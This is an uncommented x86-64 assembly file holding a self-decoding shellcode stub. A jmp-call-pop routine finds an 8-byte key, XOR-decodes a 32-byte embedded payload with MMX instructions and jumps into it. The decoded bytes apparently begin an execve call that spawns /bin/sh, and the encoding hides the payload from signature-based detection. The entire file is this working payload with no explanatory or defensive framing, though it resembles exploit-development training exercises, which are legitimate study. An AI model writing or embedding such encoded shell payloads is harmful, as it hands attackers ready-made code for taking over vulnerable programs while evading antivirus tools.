global _start

section .text

_start:

	jmp call_decoder

decoder:

	pop rdi
	lea rsi, [rdi+8]
	xor rcx, rcx
	add rcx, 4

decode:

	movq mm0, qword [rdi]
	movq mm1, qword [rsi]
	pxor mm0, mm1

	movq qword [rsi], mm0
	add rsi, 8
	loop decode

	jmp short code

call_decoder:

	call decoder
	key: db 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1 
	code: db 0xe2,0x9a,0x6c,0xfd,0xe6,0x14,0x9f,0xd3,0xc3,0xc5,0x83,0x82,0xdd,0xc7,0xe3,0xf9,0x23,0x4c,0xfc,0xe5,0x27,0x4d,0xe7,0xf9,0x23,0x4d,0xe4,0x2e,0x6e,0x94,0xbf,0xb4
